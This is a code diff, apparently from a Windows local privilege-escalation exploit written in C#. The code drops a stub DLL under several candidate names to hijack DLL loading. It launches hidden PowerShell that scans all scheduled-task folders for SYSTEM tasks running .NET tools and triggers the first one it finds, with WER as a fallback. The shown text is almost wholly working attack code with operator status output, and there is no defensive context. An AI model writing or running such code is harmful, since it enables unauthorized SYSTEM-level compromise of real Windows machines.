@@ -311,22 +311,41 @@ if($r-eq 0){
             try { File.Copy(dllPath, Path.Combine(fakePath,d), true); } catch {}
         Console.WriteLine($"[+] Dropped stub.dll as {dllNames.Length} candidate DLLs");
 
-        /* Enumerate ALL .NET Framework tasks and run them */
-        string ngenPs =
-            "try{$s=New-Object -ComObject Schedule.Service;$s.Connect();" +
-            "$f=$s.GetFolder('\\Microsoft\\Windows\\.NET Framework');" +
-            "$n=$f.GetTasks(0).Count;" +
-            "Write-Host('tasks:'+$n);" +
-            "foreach($t in $f.GetTasks(0)){$t.Run($null);Write-Host('[run]'+$t.Name)}" +
-            "}catch{Write-Host('ngen-err:'+$_)}";
-        var npsi = new System.Diagnostics.ProcessStartInfo("powershell.exe",
-            $"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"{ngenPs}\"")
+        /* Enumerate ALL SYSTEM tasks across all folders - find any that run .NET (powershell, mscorsvw, etc.) */
+        string findTasksPs =
+            "function Scan($f){" +
+            "  foreach($t in $f.GetTasks(0)){" +
+            "    foreach($a in $t.Definition.Actions){" +
+            "      if($a.Type -eq 0 -and ($a.Path -match 'powershell|mscorsvw|csc\\.exe|vbc\\.exe')){" +
+            "        Write-Host('[dotnet]'+$t.Path+' -> '+$a.Path)" +
+            "      }" +
+            "    }" +
+            "  }" +
+            "  foreach($sf in $f.GetFolders(0)){Scan $sf}" +
+            "}" +
+            "$s=New-Object -ComObject Schedule.Service;$s.Connect();" +
+            "Scan($s.GetFolder('\\'))";
+        var fpsi = new System.Diagnostics.ProcessStartInfo("powershell.exe",
+            $"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"{findTasksPs}\"")
             {UseShellExecute=false,CreateNoWindow=true,RedirectStandardOutput=true,RedirectStandardError=true};
-        string ngenOut = "";
-        using(var p=System.Diagnostics.Process.Start(npsi)) {
-            ngenOut = p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd(); p.WaitForExit(8000);
+        string foundTasks = "";
+        using(var p=System.Diagnostics.Process.Start(fpsi)) {
+            foundTasks = p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd(); p.WaitForExit(15000);
         }
-        Console.WriteLine($"[+] NGEN: {ngenOut.Trim()}");
+        Console.WriteLine($"[*] .NET SYSTEM tasks found:\n{foundTasks.Trim()}");
+
+        /* Trigger any powershell SYSTEM task we found */
+        if (foundTasks.Contains("[dotnet]")) {
+            string line = foundTasks.Split('\n')[0];
+            string taskPath = line.Replace("[dotnet]","").Split('>')[0].Trim();
+            string runPs = $"$s=New-Object -ComObject Schedule.Service;$s.Connect();" +
+                           $"$t=$s.GetFolder('\\').GetTask('{taskPath}');$t.Run($null)";
+            var rpsi = new System.Diagnostics.ProcessStartInfo("powershell.exe",
+                $"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"{runPs}\"")
+                {UseShellExecute=false,CreateNoWindow=true};
+            using(var p=System.Diagnostics.Process.Start(rpsi)) p.WaitForExit(5000);
+            Console.WriteLine($"[+] Triggered: {taskPath}");
+        }
 
         /* Also trigger WER as fallback */
         string werPs = "$s=New-Object -ComObject Schedule.Service;$s.Connect();" +
